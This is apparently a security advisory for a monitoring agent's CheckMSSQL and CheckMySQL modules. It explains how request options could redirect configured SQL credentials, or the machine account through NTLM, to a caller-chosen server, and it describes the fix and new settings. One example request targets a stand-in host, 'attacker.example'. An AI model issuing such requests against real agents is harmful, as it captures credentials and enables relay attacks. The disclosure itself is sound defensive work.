---
title: "SQL checks could send the configured login, or the machine account, to a caller-chosen server"
fixed_in: next
severity: "Medium"
modules: [CheckMSSQL, CheckMySQL]
action: conditional
---
Every `check_mssql*` and `check_mysql*` command starts from the connection
configured under `/settings/mssql` or `/settings/mysql` and then applies the
request's connection options on top. `server=` / `host=` / `port=` (and, for
SQL Server, `driver=`, `connection-string=`, `trust-cert=` and `encrypt=`)
moved the destination or weakened how it is authenticated, while the
configured credentials stayed in place. Any principal allowed to run the
module's checks could therefore have the agent authenticate to a server of
its choosing:

```
GET /api/v1/queries/check_mssql/commands/execute?server=attacker.example
```

- **CheckMSSQL** with a configured `user` / `password` sent that SQL login
  in the TDS login to the named server. With none configured - the default -
  the connection uses Windows integrated authentication, so the agent
  authenticated as its own account (LocalSystem: the machine account) to the
  caller's host, which is an NTLM relay vector. `trust-cert` is on by default,
  so the server certificate was not validated either way.
- **CheckMySQL** sent the configured `user` / `password`, or the `[client]`
  credentials of the configured `defaults file`, to the named host.

The checks are reachable over REST with `queries.execute` (both seeded roles
carry it, and the core permission policy is off by default), and over NRPE
with the non-default `allow arguments = true`.

A request that would move the configured credentials is now refused before
anything is contacted, unless it brings its own `user=` and `password=` or the
module opts in with the new `allow host override` setting (default `false`),
the same opt-in the client targets have. A request that changes none of those
options, and - for CheckMySQL - a module with no credentials configured, are
unaffected. Asking for more protection is never refused: `tls=true`, or
`trust-cert=false` where the configuration trusts the certificate. A
`connection-string=` from the request picks its own authentication
(`Trusted_Connection=yes` included), so it always needs the opt-in.

CheckMSSQL also gains `trust server certificate` (default `true`, the previous
behaviour) and `encrypt` settings, so certificate validation can be turned on
for every check rather than per request.

**What to do:** a request that points a check at another server without
supplying credentials now fails with a message naming `allow host override`.
Pass `user=` and `password=` with the request, configure the server in
`/settings/mssql` / `/settings/mysql`, or set `allow host override = true`
there to keep the old behaviour. Where the SQL Server instance has a
certificate the agent trusts, set `trust server certificate = false`.
